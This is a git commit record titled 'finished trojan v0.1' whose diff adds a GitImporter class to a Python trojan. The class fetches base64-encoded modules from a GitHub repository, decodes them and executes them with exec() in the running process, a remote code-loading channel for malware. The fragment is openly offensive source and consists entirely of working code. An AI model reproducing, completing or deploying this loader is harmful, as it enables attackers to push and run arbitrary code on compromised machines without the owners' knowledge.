d9ed8b1cb92ea3fae400bb6616f3647550b62221
Anderaxarex <a.scarpanti06@gmail.com>
2022-02-08 15:16:34 +0100

    finished trojan v0.1

--- tro.py
+++ tro.py
@@ -57,4 +57,21 @@ class Trojan:
 
             time.sleep(random.randint(3*60, 3*60*60))
 
-
+class GitImporter:
+    def __init__(self):
+        self.current_module_code=""
+    
+    def find_module(self, name, path=None):
+        print("[||] Retrieving %s" % name)
+        self.repo = connect_to_github()
+        new_library = get_content('modules', f'{name}.py', self.repo)
+        if new_library is not None:
+            self.current_module_code = base64.b64decode(new_library)
+            return self
+    
+    def load_modules(self, name):
+        spec = importlib.util.spec_from_loader(name, loader=None, origin=self.repo.git_url)
+        new_module = importlib.util.module_from_spec(spec)
+        exec(self.current_module_code, new_module.__dict__)
+        sys.modules[spec.name] = new_module
+        return new_module
